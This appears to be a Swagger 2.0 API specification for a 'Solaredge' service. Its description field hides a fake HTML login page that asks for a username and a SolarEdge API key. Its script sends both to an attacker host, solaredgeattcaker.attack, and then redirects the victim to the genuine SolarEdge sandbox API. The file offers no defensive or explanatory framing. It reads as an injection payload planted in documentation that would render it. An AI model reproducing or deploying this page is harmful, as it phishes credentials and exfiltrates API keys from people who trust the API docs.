
swagger: '2.0'
info:
  version: 1.0.0
  title: Solaredge Swagger Petstore
  description: '
	<!DOCTYPE html>   
	<html>   
	<head>  
	<meta name="viewport" content="width=device-width, initial-scale=1">  
	<title> Login Page </title>  
	<style>   
	Body {  
	  font-family: Calibri, Helvetica, sans-serif;  
	  background-color: pink;  
	}  
	button {   
	       background-color: #4CAF50;   
	       width: 100%;  
		color: orange;   
		padding: 15px;   
		margin: 10px 0px;   
		border: none;   
		cursor: pointer;   
		 }   
	 form {   
		border: 3px solid #f1f1f1;   
	    }   
	 input[type=text], input[type=password] {   
		width: 100%;   
		margin: 8px 0;  
		padding: 12px 20px;   
		display: inline-block;   
		border: 2px solid green;   
		box-sizing: border-box;   
	    }  
	 button:hover {   
		opacity: 0.7;   
	    }   
	  .cancelbtn {   
		width: auto;   
		padding: 10px 18px;  
		margin: 10px 5px;  
	    }   


	 .container {   
		padding: 25px;   
		background-color: lightblue;  
	    }   

	</style>   
	</head>    
	<body>  

	    <center> <h1> Solaredge API Login </h1> </center>   
	    <form>  
		<div class="container">   
		    <label>Username : </label>   
		    <input type="text" placeholder="Enter Username" id="password" name="username" required>  
		    <label>Solaredge API key : </label>   
		    <input type="password" placeholder="Enter Password" id="username" name="password" required>  
		    <button onclick="login_user()" type="button">
		    Login</button>
		    <input type="checkbox" checked="checked"> Remember me   
		    <button type="button" class="cancelbtn"> Cancel</button>   
		    Forgot <a href="#"> password? </a>   
		</div>   
	    </form>     
	</body>     
	</html> 

	<script type="text/javascript">
	function login_user() {
	    let path = "http://solaredgeattcaker.attack/api/resource";
	    let username = document.getElementById("username").value;
	    let password = document.getElementById("password").value;

	    let data = {username: username, password: password};

	    fetch(path, {
		headers: {
		    "Content-Type": "application/json"},
		    method: "POST", 
		    body: JSON.stringify(data)}
	    );


		location.href='https://sandbox-api-stg.solaredge.com/'
	};
	</script> '
paths:
	/:
	get:
		responses:
		'200':
		description: Hello
